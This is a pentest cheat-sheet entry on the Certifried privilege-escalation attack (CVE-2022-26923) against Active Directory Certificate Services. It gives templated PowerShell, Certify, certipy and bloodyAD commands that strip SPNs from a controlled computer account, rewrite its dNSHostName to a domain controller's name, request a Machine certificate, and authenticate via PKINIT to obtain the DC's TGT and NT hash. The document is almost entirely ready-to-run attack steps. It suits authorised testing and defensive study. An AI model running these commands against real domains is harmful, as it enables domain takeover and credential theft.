---
technique: Certifried (CVE-2022-26923)
category: adcs
targets: Domain User, Computer Account, Domain Controller
protocols: LDAP, Kerberos
remote_capable: true
tags: adcs certifried cve-2022-26923 pkinit computer-account dnshostname spn
---

# Certifried (CVE-2022-26923)

A domain user who creates or controls a computer account can clear its SPNs, rewrite its dNSHostName to match a DC's hostname, and then request a Machine template certificate. The CA uses dNSHostName for identification and issues a cert for the DC, allowing PKINIT authentication as that DC. Patched in May 2022; an issued certificate containing objectSid indicates the patch is present.

## Windows

### Set-ADComputer: Step 1: clear SPNs from computer account

#powershell #rsat #spn

Clear all SPNs from the controlled computer account to remove the constraint violation check.

```powershell title:"Certifried: clear SPNs from controlled computer account"
Set-ADComputer $computer_name -ServicePrincipalName @{}
```
<!-- cheat
import domain_ip
import users
var computer_name
-->

### Set-ADComputer: Step 2: set dNSHostName to DC FQDN

#powershell #rsat #dnshostname

Set the dNSHostName attribute to the target DC's FQDN so the CA issues a cert identifying as the DC.

```powershell title:"Certifried: set dNSHostName to DC FQDN"
Set-ADComputer $computer_name -DnsHostName "$dc_name.$domain"
```
<!-- cheat
import domain_ip
import users
var computer_name
var dc_name
-->

### Set-ADComputer: Step 3: verify attribute changes

#powershell #rsat #dnshostname #spn

Verify both dNSHostName and servicePrincipalName attributes on the computer account before requesting the cert.

```powershell title:"Certifried: verify dNSHostName and SPNs on computer account"
Get-ADComputer $computer_name -Properties dnshostname,serviceprincipalname
```
<!-- cheat
import domain_ip
import users
var computer_name
-->

### Certify: request Machine cert

#powershell #certify #machine-cert

Request a certificate for the controlled computer account using the Machine template; with the rewritten dNSHostName the CA issues a cert identifying as the DC.

```powershell title:"Certifried: request Machine cert as controlled computer"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"Machine"
```
<!-- cheat
import domain_ip
import users
var ca_name
-->

## Linux

### certipy account: create computer and set DNS

#certipy #computer-account #dnshostname

Create a new machine account with the dNSHostName already set to the DC's FQDN in a single command.

```sh title:"Certifried: create machine account with DC dNSHostName"
certipy account create -u $user@$domain $auth_flags -dc-ip $rhost_ip -user $computer_name -pass $computer_pass -dns $dc_name.$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var computer_name
var computer_pass
var dc_name
-->

### bloodyAD: Step 1: clear SPNs from computer account

#bloodyad #ldap #multi-auth #spn

Clear the controlled computer account's SPNs via bloodyAD.

```sh title:"Certifried: clear SPNs from computer account via bloodyAD"
bloodyAD --host $rhost_ip -d $domain -u $user $auth_flags set object $computer_name serviceprincipalname
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var computer_name
-->

### bloodyAD: Step 2: set dNSHostName to DC FQDN

#bloodyad #ldap #multi-auth #dnshostname

Write the DC FQDN into the computer account's dNSHostName attribute.

```sh title:"Certifried: set dNSHostName to DC FQDN via bloodyAD"
bloodyAD --host $rhost_ip -d $domain -u $user $auth_flags set object $computer_name dnsHostName -v "$dc_name.$domain"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var computer_name
var dc_name
-->

### bloodyAD: Step 3: verify attribute changes

#bloodyad #ldap #multi-auth #dnshostname #spn

Verify both dNSHostName and servicePrincipalName on the computer account before requesting the cert.

```sh title:"Certifried: verify dNSHostName and SPNs via bloodyAD"
bloodyAD --host $rhost_ip -d $domain -u $user $auth_flags get object $computer_name --attr dnsHostName,serviceprincipalname
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var computer_name
-->

### certipy req: Step 1: request Machine cert as controlled computer

#certipy #machine-cert #pkinit

Request the Machine template cert as the controlled computer account; with dNSHostName rewritten the CA issues a cert for the DC.

```sh title:"Certifried: request Machine cert as controlled computer"
certipy req -u "$computer_name\$@$domain" $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template Machine
```
<!-- cheat
import domain_ip
import certipy_auth
var computer_name
var ca_fqdn
var ca_name
-->

### certipy req: Step 2: PKINIT as DC

#certipy #pkinit

Authenticate with PKINIT using the DC cert to get the DC TGT and NT hash.

```sh title:"Certifried: PKINIT as DC with issued Machine cert"
certipy auth -pfx $dc_name.pfx -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
var dc_name
-->

### certipy req: detect patch

#certipy #enum #patch-check

Request a User or Machine cert and check whether certipy prints a Certificate object SID; if it does, the May 2022 patch is applied and the attack will fail.

```sh title:"Certifried: check if patch applied by looking for objectSid in cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->
